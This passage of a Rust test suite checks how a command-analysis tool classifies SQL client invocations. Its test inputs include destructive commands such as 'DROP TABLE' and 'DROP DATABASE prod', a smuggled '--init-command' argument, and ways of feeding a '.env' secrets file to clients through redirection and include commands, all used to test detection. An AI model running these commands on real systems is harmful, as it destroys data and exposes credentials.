        assert!(!has_effect(&plan, "network.connect", "snowflakecomputing"));
    }
    for argv in [
        &["snowsql", "-c", "prod", "-q", "DROP TABLE t"][..],
        &["snow", "sql", "--connection", "prod", "-q", "DROP TABLE t"],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(
            has_boundary(&plan, "unrecoverable_source", None),
            "{argv:?}"
        );
        assert!(!has_effect(&plan, "network.connect", "snowflakecomputing"));
    }
    let plan = exec(
        &root.0,
        &["sqlite3", "app.db", ".open other.db", "DROP TABLE t"],
        true,
    );
    assert!(has_effect(&plan, "filesystem.write", "other.db"));
    assert!(has_effect(&plan, "database.schema_drop", "other.db"));
    // mysql sends --init-command when it connects, before -e.
    let plan = exec(
        &root.0,
        &[
            "mysql",
            "app",
            "-e",
            "DROP TABLE t",
            "--init-command=USE prod",
        ],
        true,
    );
    assert!(has_effect(&plan, "database.schema_drop", "\"prod\""));
    assert!(!has_effect(&plan, "database.schema_drop", "\"app\""));
    // A password in a short cluster is not read as `-e`.
    let plan = exec(&root.0, &["mysql", "-Bpsecret", "-e", "DROP TABLE t"], true);
    assert!(plan["boundaries"].as_array().is_none_or(Vec::is_empty));
    // An unknown flag may swallow --help, so the input still runs.
    let plan = exec(
        &root.0,
        &[
            "mysql",
            "--network-namespace",
            "--help",
            "-e",
            "DROP DATABASE prod",
        ],
        true,
    );
    assert!(has_effect(&plan, "database.schema_drop", "\"prod\""));
    assert!(has_boundary(&plan, "unrecognized_arguments", None));
}

#[test]
fn sql_clients_run_a_redirected_stdin_file_as_their_script() {
    let root = TempRoot::new();
    for (path, text) in [
        ("drop.sql", "DROP TABLE users;\n"),
        ("select.sql", "SELECT * FROM users;\n"),
        (".env", "API_KEY=secret\n"),
        ("decoy/drop.sql", "SELECT * FROM users;\n"),
        ("decoy/.env", "SELECT 1;\n"),
    ] {
        let path = root.0.join(path);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
    let shell = |command: &str| run(&root.0, "shell", &[command.to_string()], true);
    for command in [
        "psql -d app < drop.sql",
        "< drop.sql psql -d app",
        "psql -d app 0< drop.sql",
        "mysql app < drop.sql",
        "sqlite3 app.db < drop.sql",
        "clickhouse-client < drop.sql",
        "sudo -u postgres psql -d app < drop.sql",
        // The shell opens the file before `env` changes the client's cwd.
        "env -C decoy psql -d app < drop.sql",
    ] {
        let plan = shell(command);
        assert!(
            has_effect(&plan, "database.schema_drop", "\"users\""),
            "{command}"
        );
        assert!(
            !has_boundary(&plan, "unrecoverable_source", None),
            "{command}"
        );
    }
    // A benign script reads, and drops nothing.
    let plan = shell("psql -d app < select.sql");
    assert!(has_effect(&plan, "database.read", "\"users\""));
    assert!(!has_effect(&plan, "database.schema_drop", "\"users\""));
    // A file we cannot hold keeps the stdin session's boundary, as `-f` does.
    for command in [
        "psql -d app < missing.sql",
        "psql -d app < \"$F\"",
        "psql -d app < *.sql",
    ] {
        let plan = shell(command);
        assert!(!has_effect(&plan, "database.schema_drop", "\"users\""));
        assert!(
            has_boundary(&plan, "unrecoverable_source", None),
            "{command}"
        );
    }
    // Here-documents still feed their text.
    let plan = shell("psql -d app <<'X'\nDROP TABLE users;\nX");
    assert!(has_effect(&plan, "database.schema_drop", "\"users\""));
    // A consumer that does not run stdin as SQL only reads the file.
    let plan = shell("cat < drop.sql");
    assert!(has_effect(&plan, "filesystem.read", "drop.sql"));
    assert!(!has_effect(&plan, "database.schema_drop", "\"users\""));
    // A redirected secret stays a read of that file, now as the program's
    // input, from the shell's cwd whatever cwd `env -C` gives the client;
    // `-f` and every client's include command run it as the same program input.
    for command in [
        "psql -d app < .env",
        "env -C decoy psql -d app < .env",
        "psql -d app -f .env",
        "psql -d app -c '\\i .env'",
        "psql -d app -c '\\ir .env'",
        "mysql app -e 'source .env'",
        "mysql app -e '\\. .env'",
        "sqlite3 app.db '.read .env'",
        "sqlcmd -Q ':r .env'",
        "snowsql -q '!source .env'",
        "cqlsh -e 'SOURCE .env'",
    ] {
        let plan = shell(command);
        let inputs = plan["effects"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|effect| effect["attributes"]["access_purpose"] == "program_input")
            .map(|effect| effect["resource"].to_string())
            .collect::<Vec<_>>();
        let secret = format!("{}/.env\"", root.0.to_str().unwrap());
        assert!(
            inputs.iter().any(|resource| resource.contains(&secret)),
            "{command}: {inputs:?}"
        );
        assert!(
            !inputs.iter().any(|resource| resource.contains("decoy")),
            "{command}"
        );
    }
}
